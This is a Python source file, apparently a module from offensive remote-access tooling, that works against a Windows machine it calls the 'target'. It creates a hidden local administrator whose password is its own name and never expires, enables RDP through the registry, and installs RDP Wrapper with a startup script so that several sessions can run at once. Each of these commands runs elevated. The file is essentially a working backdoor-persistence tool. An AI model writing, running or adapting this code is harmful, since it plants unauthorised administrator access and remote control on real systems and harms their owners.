import win32com.shell.shell as shell
import uuid
from os import environ, path
from os.path import abspath, dirname


__RDP_FOLDER_PATH       = path.normpath(r"%s\RDP Wrapper"%environ['ProgramFiles'])
__RDP_FILES_PATH        = path.normpath(r"%s\files\RDPWrapper"%dirname(dirname(abspath(__file__))))
__BAT_ON_STARTUP_PATH   = path.normpath(r"%s\helper\autoupdate__enable_autorun_on_startup.bat"%__RDP_FOLDER_PATH)
__BAT_AUTOUPDATE_PATH   = path.normpath(r"%s\autoupdate.bat"%__RDP_FOLDER_PATH)


def __set_user_account_password_to_never_expire(username):
    command = f"WMIC USERACCOUNT WHERE Name='{username}' SET PasswordExpires=FALSE"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)


def __copy_files_to_rdp_folder():
    command = f"xcopy \"{__RDP_FILES_PATH}\" \"{__RDP_FOLDER_PATH}\\\" /I /S /Q /Y"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)


def __enable_multiple_synchronous_rdp_on_startup():
    command = f"\"{__BAT_ON_STARTUP_PATH}\""
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)


def __update_multiple_synchronous_rdp_to_match_os():
    command = f"\"{__BAT_AUTOUPDATE_PATH}\""
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)


def __enable_multiple_synchronous_rdp_clients():
    __copy_files_to_rdp_folder()
    __enable_multiple_synchronous_rdp_on_startup()
    __update_multiple_synchronous_rdp_to_match_os()


def create_user_account_on_target():
    username = uuid.uuid4().hex[:6]
    try:
        command = f"net user {username} {username} /add /active:yes"
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        __set_user_account_password_to_never_expire(username)
        return username
    except:
        return None


def add_user_account_to_administrators(username):
    try:
        command = f"net localgroup administrators {username} /add"
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        return True
    except:
        return False


def enable_rdp_on_target():
    command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
    try:
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        __enable_multiple_synchronous_rdp_clients()
        return True
    except:
        return False
